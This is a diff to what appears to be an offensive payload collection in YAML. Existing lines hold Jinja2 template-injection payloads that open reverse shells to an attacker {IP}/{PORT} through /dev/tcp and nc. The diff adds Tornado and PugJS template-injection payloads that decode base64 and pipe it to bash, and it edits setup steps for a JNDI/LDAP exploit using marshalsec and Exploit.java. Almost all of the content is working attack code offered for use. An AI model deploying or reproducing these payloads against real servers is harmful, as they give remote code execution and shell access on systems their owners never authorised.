@@ -429,6 +429,19 @@ payload:
       {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"')|attr('read')()}}
 
       {% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f').read()}}{%endif%}{%endfor%}
+    - |
+      # Tornado
+      
+      {% import os %}{{os.system('echo {BASE64} | base64 -d | bash')}}
+      
+      {% import os %}{{os.system('echo {BASE64_URLENCODE} | base64 -d | bash')}}
+    - |
+      # PugJS
+      
+      #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('echo {BASE64} | base64 -d | bash')}()}
+      
+      #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('echo {BASE64_URLENCODE} | base64 -d | bash')}()}
+      
 
       #References
 
@@ -1473,7 +1486,7 @@ payload:
       # Commands To Run
       -> Run javac Exploit.java -source 8 -target 8
       -> Run python3 -m http.server 80 in the directory of Exploit.java
-      -> RUN java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{IP}/#Exploit" (Listening Port)
+      -> Run java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{IP}/#Exploit" (Listening Port)
     - |
       # Exploit (Save as Exploit.java)
       public class Exploit {
